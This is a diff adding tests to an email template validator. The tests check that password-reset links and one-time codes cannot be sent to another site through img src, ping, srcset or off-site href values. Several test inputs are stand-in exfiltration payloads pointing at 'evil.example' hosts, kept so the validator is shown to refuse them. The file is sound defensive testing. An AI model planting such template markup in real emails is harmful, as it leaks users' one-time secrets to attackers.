@@ -71,7 +71,7 @@ test('unsafe HTML is refused on the field that carries it', () => {
   hasError(validateTemplate('otp', otp({ preheader: '<a href="javascript:x">a</a>' }), LAYOUT), 'preheader', /script or data/);
 });
 
-test('placeholders in attributes: links only in quoted href and src, never code wording or HTML', () => {
+test('placeholders in attributes: links only in a quoted href, never code wording or HTML', () => {
   const opened = (html) => ({ name: 'Opened', subject: 'Opened', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
   assert.deepEqual(validateTemplate('project_opened', opened('<a href="{{url}}" title="{{app}}">go</a>'), LAYOUT), { ok: true });
   hasError(validateTemplate('project_opened', opened('<a href={{url}}>go</a>'), LAYOUT), 'html', /quoted/);
@@ -236,4 +236,37 @@ test('the required check sees the code as a reader would, references decoded', (
   const fields = { subject: 's', preheader: '', why: '', html: '<p>&#{{code}}</p>', text: '{{code}}' };
   assert.match(requiredOnEveryPath(actionFor('otp'), fields, null).message, /\{\{code\}\}/);
   assert.equal(requiredOnEveryPath(actionFor('otp'), { ...fields, html: '<p>{{code}}</p>' }, null), null);
+});
+
+test('a link placeholder cannot hand its one-time secret to another site', () => {
+  const reset = englishTemplate('password_reset');
+  const layout = SEEDS.layouts[0];
+  const withHtml = (extra) => ({ ...reset, html: `${reset.html}${extra}` });
+  // The reviewer's proof of concept: an image the mail client fetches on open.
+  hasError(validateTemplate('password_reset', withHtml('<p><img src="https://evil.example/p.gif?u={{url}}" alt=""></p>'), layout), 'html', /only go in href/);
+  hasError(validateTemplate('password_reset', withHtml('<p><img src="{{url}}" alt=""></p>'), layout), 'html', /only go in href, not in src/);
+  hasError(validateTemplate('password_reset', withHtml('<p><a href="https://evil/?u={{url}}">x</a></p>'), layout), 'html', /whole href value/);
+  hasError(validateTemplate('password_reset', withHtml('<p><a href="{{url}}" ping="https://evil/?c={{url}}">x</a></p>'), layout), 'html', /not in ping/);
+  for (const attr of ['srcset', 'background', 'poster']) {
+    hasError(validateTemplate('password_reset', withHtml(`<p><a href="{{url}}" ${attr}="{{url}}">x</a></p>`), layout), 'html', new RegExp(`not in ${attr}`));
+  }
+  const otp = englishTemplate('otp');
+  hasError(validateTemplate('otp', { ...otp, html: `${otp.html}<p><a href="https://x.example/" ping="https://evil/?c={{code}}">x</a></p>` }, layout), 'html', /Only a link placeholder can go in ping/);
+  // The whole value, space around it allowed.
+  assert.deepEqual(validateTemplate('password_reset', withHtml('<p><a href=" {{url}} ">again</a></p>'), layout), { ok: true });
+});
+
+test('in the text version a link placeholder stands apart from other text', () => {
+  const reset = englishTemplate('password_reset');
+  const layout = SEEDS.layouts[0];
+  const withText = (extra) => ({ ...reset, text: `${reset.text}${extra}` });
+  hasError(validateTemplate('password_reset', withText('\nhttps://evil.example/?u={{url}}'), layout), 'text', /stand on its own/);
+  hasError(validateTemplate('password_reset', withText('\nx=({{url}})'), layout), 'text', /stand on its own/);
+  hasError(validateTemplate('password_reset', withText('\n{{#if url}}?u={{/if}}{{url}}'), layout), 'text', /stand on its own/);
+  hasError(validateTemplate('password_reset', withText('\n{{url}}/x'), layout), 'text', /stand on its own/);
+  for (const ok of ['\nAgain: {{url}}.', '\n({{url}})', '\n\u3053\u3061\u3089\uff1a{{url}}']) {
+    assert.deepEqual(validateTemplate('password_reset', withText(ok), layout), { ok: true }, ok);
+  }
+  const invite = englishTemplate('project_invite');
+  hasError(validateTemplate('project_invite', { ...invite, text: `${invite.text}\n{{inviter}}{{url}}` }, layout), 'text', /stand on its own/);
 });
